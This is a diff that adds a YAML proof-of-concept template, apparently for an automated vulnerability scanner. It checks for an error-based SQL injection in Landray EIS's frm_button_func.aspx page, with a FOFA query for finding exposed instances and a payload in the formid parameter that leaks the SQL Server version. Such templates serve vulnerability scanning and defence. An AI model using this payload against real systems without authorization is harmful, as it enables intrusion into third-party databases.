@@ -1,0 +1,22 @@
+id: poc-yaml-landray-eis-frm-button-func-sqli
+info:
+  name: 蓝凌EIS智慧协同平台 frm_button_func sql注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 蓝凌EIS
+  fofa: app="Landray-EIS智慧协同平台"
+requests:
+- method: GET
+  path: /frm/frm_button_func.aspx?formid=1%20and%201=@@version--+
+  expression: 'status_code == 500 &&
+
+    contains(body,"Microsoft SQL Server") &&
+
+    contains(body,"nvarchar") &&
+
+    contains(body,"Windows")
+
+    '
+variables: {}
+transport: http
